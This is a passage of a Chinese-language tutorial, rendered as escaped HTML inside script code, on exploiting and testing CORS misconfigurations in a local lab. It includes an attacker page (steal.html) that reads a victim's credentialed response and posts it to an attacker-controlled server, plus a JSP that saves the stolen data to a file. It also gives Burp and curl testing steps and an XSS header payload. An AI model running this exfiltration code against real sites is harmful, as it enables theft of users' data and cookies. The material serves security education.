punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token comment">//if receive xhr response</span>\n            <span class="token punctuation">{</span>\n                <span class="token comment">//var datas=xhr.responseText;</span>\n                <span class="token comment">//alert(datas);</span>\n                <span class="token comment">//document.getElementById(&quot;demo&quot;).innerHTML = alert(this.responseText);</span>\n                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;demo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// request vuln page，需要攻击的目标</span>\n        xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;true&quot;</span><span class="token punctuation">)</span>\n        xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="绕过-http-only-获取-cookie" tabindex="-1"><a class="header-anchor" href="#绕过-http-only-获取-cookie"><span>绕过 http_only 获取 cookie</span></a></h3><ol><li>在攻击这服务器创建 cookiebypass.jsp​​</li></ol><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">&lt;</span><span class="token operator">%</span>@ page language<span class="token operator">=</span><span class="token string">&quot;java&quot;</span> contentType<span class="token operator">=</span><span class="token string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding<span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">%</span>\n    <span class="token class-name">String</span> res <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">&quot;ck&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n    <span class="token class-name">String</span> fileName <span class="token operator">=</span> <span class="token string">&quot;secrect.html&quot;</span><span class="token punctuation">;</span>\n    <span class="token class-name">String</span> webPath <span class="token operator">=</span> application<span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token class-name">String</span> filePath <span class="token operator">=</span> webPath <span class="token operator">+</span> fileName<span class="token punctuation">;</span>\n\n    <span class="token keyword">try</span> <span class="token punctuation">{</span>\n        <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileWriter</span> fileWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileWriter</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        fileWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        fileWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;File created successfully.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Error occurred while creating the file.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token operator">%</span><span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>在攻击者可控网站创建 steal.html​​</li></ol><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!DOCTYPE</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>cors exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">\n    <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">var</span> xhr1<span class="token punctuation">;</span>\n        <span class="token keyword">var</span> xhr2<span class="token punctuation">;</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            xhr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>\n            xhr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">&quot;Microsoft.XMLHTTP&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">&quot;Microsoft.XMLHTTP&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n        xhr1<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr1<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr1<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">var</span> datas <span class="token operator">=</span> xhr1<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>\n                <span class="token comment">// 攻击这服务器地址</span>\n                xhr2<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://mob.exp:8081/manager/cookiebypass.jsp&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;true&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                xhr2<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Content-type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n                xhr2<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&quot;ck=&quot;</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>datas<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n        <span class="token punctuation">}</span>\n        <span class="token comment">// 需要攻击的目标</span>\n        xhr1<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;true&quot;</span><span class="token punctuation">)</span>\n        xhr1<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>\n        xhr1<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>',7),rn={href:"http://mob.exp:8081/manager/steal.html",target:"_blank",rel:"noopener noreferrer"},un=(0,e.Fv)('<figure><img src="'+r+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="方法二-利用-burpsuit" tabindex="-1"><a class="header-anchor" href="#方法二-利用-burpsuit"><span>方法二：利用 Burpsuit</span></a></h2><p>搭建测试环境，Nginx 配置如下：</p><figure><img src="'+u+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ol><li><p>选择 <code>Proxy -- Options -- Match and Replace</code>，勾选 Request header。</p><p>将空替换为 Origin:foo.example.org​​​ 的 Enable 框。</p><p>然后在网站一阵乱点，最后在 HTTP history 来筛选带有 CORS 头部的值，然后用以上工具查看是否有配置缺陷。</p></li></ol><figure><img src="'+d+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ol start="2"><li>Burpsuite：自动在 HTTP 请求包中加上 Origin 的头部字段。</li></ol><figure><img src="'+k+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ol start="3"><li>在 Filter by search term 中输入：<code>Access-Control-Allow-Origin: foo.example.org​​</code></li></ol><figure><img src="'+v+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><ol start="4"><li>HTTP history 列表中出现符合条件的请求包，点击 Ctrl+R（发送到 Repeater），点击 GO，观察返回的 CORS 配置。</li></ol><figure><img src="'+m+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="方法三-curl-命令" tabindex="-1"><a class="header-anchor" href="#方法三-curl-命令"><span>方法三：curl 命令</span></a></h2><p>curl 命令，输入</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">curl</span> http://127.0.0.1/DoraBox-master/csrf/userinfo.php <span class="token parameter variable">-H</span> <span class="token string">&quot;Origin: https://example.com/&quot;</span> <span class="token parameter variable">-I</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="'+g+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="方法四-浏览器测试" tabindex="-1"><a class="header-anchor" href="#方法四-浏览器测试"><span>方法四：浏览器测试</span></a></h2><p>利用 Ajax 发送一个简单请求，看是否允许。</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">&#39;http://172.16.10.113/xxxxmail&#39;</span><span class="token punctuation">;</span>\n<span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nxhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nxhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">// 或者</span>\n$<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;http://172.16.10.113/xxxxmail&quot;</span><span class="token punctuation">)</span>\n\n<span class="token operator">===</span><span class="token operator">===</span><span class="token operator">==</span>\n# 浏览器控制台示例\n# 在服务器（被攻击目标） <span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.110</span> 上配置有漏洞的 nginx<span class="token punctuation">.</span>conf\n# 打开攻击者的网站 http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token operator">/</span>，（或者随便一个网站）再打开控制台\n# 在允许的域（网站），打开控制台\n$<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;http://192.168.202.110:8081&quot;</span><span class="token punctuation">)</span>\n<span class="token punctuation">{</span><span class="token literal-property property">readyState</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">getResponseHeader</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> <span class="token literal-property property">getAllResponseHeaders</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> <span class="token literal-property property">setRequestHeader</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> <span class="token literal-property property">overrideMimeType</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> …<span class="token punctuation">}</span>\n\n# 不允许的域\n$<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;http://192.168.202.110:8081&quot;</span><span class="token punctuation">)</span>\n<span class="token punctuation">{</span><span class="token literal-property property">readyState</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">getResponseHeader</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> <span class="token literal-property property">getAllResponseHeaders</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> <span class="token literal-property property">setRequestHeader</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> <span class="token literal-property property">overrideMimeType</span><span class="token operator">:</span> ƒ<span class="token punctuation">,</span> …<span class="token punctuation">}</span>\n<span class="token operator">/</span>xxxmail<span class="token operator">/</span>xxx4<span class="token operator">/</span>index<span class="token punctuation">.</span>jsp Access to XMLHttpRequest at <span class="token string">&#39;http://192.168.202.110:8081/&#39;</span> from origin <span class="token string">&#39;http://172.16.10.113&#39;</span> has been blocked by <span class="token constant">CORS</span> <span class="token literal-property property">policy</span><span class="token operator">:</span> The <span class="token string">&#39;Access-Control-Allow-Origin&#39;</span> header has a value <span class="token string">&#39;http://mt.icoremail.net&#39;</span> that is not equal to the supplied origin<span class="token punctuation">.</span>\nloginCommon<span class="token punctuation">.</span>c2f53<span class="token punctuation">.</span>js<span class="token operator">:</span><span class="token number">1</span>     <span class="token constant">GET</span> <span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.110</span><span class="token operator">:</span><span class="token number">8081</span><span class="token operator">/</span> net<span class="token operator">:</span><span class="token operator">:</span><span class="token constant">ERR_FAILED</span> <span class="token number">200</span> <span class="token punctuation">(</span><span class="token constant">OK</span><span class="token punctuation">)</span>\nsend @\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="'+h+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="'+b+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="实验测试" tabindex="-1"><a class="header-anchor" href="#实验测试"><span>实验测试</span></a></h2><p><strong>环境准备</strong></p><p>我们首先修改 host 文件，加上</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>127.0.0.1 mob.exp\n127.0.0.1 www.vuln.com \n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>这样我们访问 www.vuln.com 就相当于服务端。服务端新建 corsvuln.jsp。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vuln<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">8081</span><span class="token operator">/</span>cors<span class="token operator">/</span>corsvuln<span class="token punctuation">.</span>jsp <span class="token operator">--</span><span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">%</span>@ page language<span class="token operator">=</span><span class="token string">&quot;java&quot;</span> contentType<span class="token operator">=</span><span class="token string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding<span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>\n<span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">&gt;</span></span>\n<span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">&gt;</span></span>\n  <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">&gt;</span></span><span class="token class-name">Vulnerability</span> <span class="token class-name">Page</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>\n<span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">&gt;</span></span>\n<span class="token operator">&lt;</span><span class="token operator">%</span>\n  out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;username: admin; password: 123456&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token operator">%</span><span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="'+w+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>',28),dn={href:"http://mob.exp:8081/manager/steal.html",target:"_blank",rel:"noopener noreferrer"},kn=(0,e.Fv)('<div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token comment">&lt;!-- mob.exp/steal.html  --&gt;</span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!DOCTYPE</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Hello,this is evil page. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">\n<span class="token keyword">function</span> <span class="token function">loadXMLDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n<span class="token punctuation">{</span>\n    <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n    xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n    <span class="token punctuation">{</span>\n        <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token comment">//if receive xhr response</span>\n        <span class="token punctuation">{</span>\n            <span class="token keyword">var</span> datas<span class="token operator">=</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>\n            <span class="token function">alert</span><span class="token punctuation">(</span>datas<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n    <span class="token comment">// request vuln page，存在漏洞的攻击目标</span>\n    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;http://www.vuln.com:8081/cors/corsvuln.jsp&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;true&quot;</span><span class="token punctuation">)</span> \n    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n<span class="token function">loadXMLDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="'+f+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>根据同源策略，这是不允许的，结果也和我们想的一样。</p><p><strong>上面说过，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js 对响应资源的操作，这点我们抓包就可以看出来。（所以说测试方法中的 1 是不对的）</strong></p><figure><img src="'+x+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们修改 corsvuln.jsp 使用 CORS 使其可以跨域访问，添加一个 Access-Control-Allow-Origin 的返回头。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Origin&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://mob.exp:8081&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>',7),vn={href:"http://mob.exp:8081/manager/steal.html",target:"_blank",rel:"noopener noreferrer"},mn=(0,e.Fv)('<figure><img src="'+A+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们只是在响应头加上了 <code>Access-Control-Allow-Origin: http://mob.exp:8081​​</code> 浏览器看到这个，认为这是服务端允许的跨域请求，就不再阻拦 js 对获取内容的操作了。</p><figure><img src="'+C+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="获取用户凭证" tabindex="-1"><a class="header-anchor" href="#获取用户凭证"><span>获取用户凭证</span></a></h2><p><strong>方式一：存在用户凭证</strong></p><table><thead><tr><th>Access-Control-Allow-Origin</th><th>“访问控制允许凭据”值</th><th>是否可利用</th><th>备注</th></tr></thead><tbody><tr><td>攻击者掌握的域名</td><td>真的</td><td>是</td><td></td></tr><tr><td><code>*</code></td><td>真的</td><td>否</td><td>浏览器报错</td></tr><tr><td>null（空值）</td><td>真的</td><td>是</td><td>任意网站使用沙盒 iframe 来获取 <code>null</code> 源</td></tr></tbody></table>',6),gn={href:"https://www.youtube.com/watch?v=PWbPbtyyNi8",target:"_blank",rel:"noopener noreferrer"},hn=(0,e.Fv)('<p><strong>方式二：不存在用户凭证</strong></p><table><thead><tr><th>Access-Control-Allow-Origin</th><th>是否可利用</th></tr></thead><tbody><tr><td>攻击者掌握的域名</td><td>是</td></tr><tr><td>null（空值）</td><td>是</td></tr><tr><td><code>*</code></td><td>是</td></tr></tbody></table><h2 id="绕过基于-ip-的认证" tabindex="-1"><a class="header-anchor" href="#绕过基于-ip-的认证"><span>绕过基于 IP 的认证</span></a></h2><p>如果目标应用程序与受害者的网络可达性，并且目标应用程序使用 IP 地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于 IP 的身份验证。</p><h2 id="客户端缓存中毒" tabindex="-1"><a class="header-anchor" href="#客户端缓存中毒"><span>客户端缓存中毒</span></a></h2><p>例如，数据报文头部中包含 <code>X-User</code> 标头，其值未进行任何输入验证，输出编码。</p><ol><li>请求包</li></ol><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/login</span> <span class="token http-version property">HTTP/1.1</span></span> \n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">www.target.local </span></span>\n<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://attacker.domain/ </span></span>\n<span class="token header"><span class="token header-name keyword">X-User</span><span class="token punctuation">:</span> <span class="token header-value">&lt;svg/onload=alert(1)&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>响应包 <code>Access-Control-Allow-Origin</code> 已被设置，<code>Access-Control-Allow-Credentials: true</code> 与 <code>Vary: Origin</code> 头已经设置。</li></ol><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span>\n<span class="token 